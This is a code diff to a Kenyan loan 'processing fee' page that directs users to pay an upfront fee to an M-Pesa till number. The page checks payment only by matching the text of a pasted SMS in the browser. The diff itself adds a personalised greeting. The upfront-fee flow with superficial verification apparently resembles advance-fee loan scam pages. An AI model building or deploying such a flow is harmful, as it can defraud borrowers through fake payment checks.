@@ -10,7 +10,7 @@
 
   <div class="bg-white/90 backdrop-blur-md max-w-sm w-full rounded-2xl shadow-2xl p-6">
     <div class="text-center mb-4">
-      <h2 class="text-2xl font-bold text-purple-800">Payment Verification</h2>
+      <h2 class="text-2xl font-bold text-purple-800">Hi, <span id="userName">User</span></h2>
       <p class="text-sm text-gray-600">Please complete your processing fee payment to continue.</p>
     </div>
 
@@ -49,29 +49,31 @@
   </div>
 
   <script>
-    // Fetch loan and fee from localStorage
+    // Get values from localStorage
+    const userName = localStorage.getItem("fullName") || "User";
     const loanAmount = parseInt(localStorage.getItem("loanAmount")) || 3000;
     const processingFee = parseInt(localStorage.getItem("processingFee")) || Math.floor(loanAmount * 0.055);
 
     // Display values
+    document.getElementById("userName").textContent = userName;
     document.getElementById("loanAmount").textContent = loanAmount.toLocaleString();
     document.getElementById("processingFee").textContent = processingFee.toLocaleString();
     document.getElementById("amountToPay").textContent = "Ksh " + processingFee.toLocaleString();
 
-    // Copy Till Number
+    // Copy till number
     function copyTill() {
       navigator.clipboard.writeText("9824375").then(() => {
         alert("Till number copied to clipboard!");
       });
     }
 
-    // Verify payment
+    // Verify payment logic
     function verifyPayment() {
       const message = document.getElementById("mpesaMessage").value.toUpperCase();
-      const expected = "HAKIKA R PROVISION";
+      const expectedText = "HAKIKA R PROVISION";
       const expectedFee = processingFee.toString();
 
-      if (message.includes(expected) && message.includes(expectedFee)) {
+      if (message.includes(expectedText) && message.includes(expectedFee)) {
         document.getElementById("status").classList.add("hidden");
         document.getElementById("success").classList.remove("hidden");
 
